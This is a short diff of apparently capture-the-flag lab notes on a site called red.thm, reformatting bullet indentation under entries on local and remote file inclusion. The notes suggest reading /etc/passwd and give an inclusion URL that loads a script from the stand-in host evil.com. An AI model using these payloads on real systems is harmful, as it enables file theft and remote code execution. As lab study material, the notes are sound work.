@@ -121,8 +121,8 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 1. Local File Inclusion (LFI)
 
 - Description: The page parameter could allow the inclusion of files from the local filesystem.
-    Risk:
-    - Attackers may read sensitive files like /etc/passwd or application configuration files.
+    - Risk:
+      Attackers may read sensitive files like /etc/passwd or application configuration files.
         Can lead to code execution if the included file contains malicious PHP code.
         - Testing:
             - Try including /etc/passwd:
@@ -133,8 +133,8 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 2. Remote File Inclusion (RFI)
 
 - Description: If the application allows remote file paths, attackers may include files hosted on a malicious server.
-    Risk:
-    - Remote code execution by including malicious scripts.
+    - Risk:
+        Remote code execution by including malicious scripts.
         - Testing:
             - Inject a remote URL:
             `http://red.thm/index.php?page=http://evil.com/malicious.txt`  
